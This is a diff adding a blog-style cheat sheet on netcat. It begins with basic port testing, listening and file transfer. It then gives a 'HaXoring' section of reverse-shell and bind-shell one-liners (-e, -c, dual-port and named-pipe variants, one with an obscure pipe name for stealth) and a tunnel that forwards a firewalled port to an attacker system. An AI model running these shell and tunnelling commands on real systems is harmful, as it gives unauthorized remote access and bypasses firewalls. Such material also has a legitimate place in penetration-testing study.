@@ -1,0 +1,89 @@
+---
+title: '1001 Used of netcat'
+series: 'Articles'
+---
+
+# <%= current_page.data.title %>
+
+## Intro
+I don't think there are 1001 uses of netcat but there are several commands that are not covered by basic tutorials
+
+
+## Basic Usage
+
+Connect to port
+  nc IP PORT
+
+Connect to port, verbose, no DNS or service lookups
+  nc -nv IP PORT
+
+Test if port is open
+  nc -vnz IP PORT
+
+Test if port is open with timeout
+  nc -vnzw1 IP PORT
+
+Listen to local port
+  nc -lp PORT
+
+For some versions (BSD) its an error to use l with p
+List to local port
+  nc -l PORT
+
+Listen to local port, stay listening after connection closed
+  nc -l(p)k PORT
+
+Open local port, verbose 
+  nc -lvp PORT
+
+Open local port, receive file
+  nc -lvp PORT > file
+
+Connect to port, send file
+  nc IP PORT < file
+
+It also works the other way around (for firewalled systems)
+Connect to port, receive file
+  nc IP PORT > file
+
+Send file to local port
+  nc -lvp PORT < file
+
+
+## HaXoring
+
+Open a reverse shell
+  nc IP PORT -e /bin/bash
+
+Open a shell on a local port
+  nc -lp PORT -e /bin/bash  
+
+Some netcat versions have an advanced -c option
+  nc IP PORT -c "/bin/bash 2>&1"
+
+Of course the bigger problem is netcat without -e (RHEL)
+Dual ports
+  nc IP PORT | /bin/bash 2>&1 | nc IP PORT+1
+
+Named Pipe
+  mkfifo /tmp/pipe;cat /tmp/pipe|nc IP PORT|/bin/bash &>/tmp/pipe;rm /tmp/pipe
+
+Named Pipe variation, use obscure pipe name, stay listening if connection closes
+  mkfifo ._b; nc -lk PORT 0<._b | /bin/bash &>._b;
+
+Alternative pipe using mknod
+  mknod /tmp/backpipe p 
+  /bin/sh 0</tmp/backpipe | nc IP PORT 1>/tmp/backpipe
+
+
+## Netcat Tunnel
+
+Forward a (firewalled) local port to an attacker system, as low tech alternative to ssh -R, assumes no -e/-c netcat
+	mkfifo pipe
+	nc IP ATTACKER_PORT < pipe | nc 127.0.0.1 LOCAL_PORT > pipe
+
+
+On the attacking system forward the tunnel to another port that can be used with a browser etc. to pentest the firewalled port
+	nc -lkp ATTACKER_PORT -c "nc -lp ATTACKER_PORT+1"
+
+
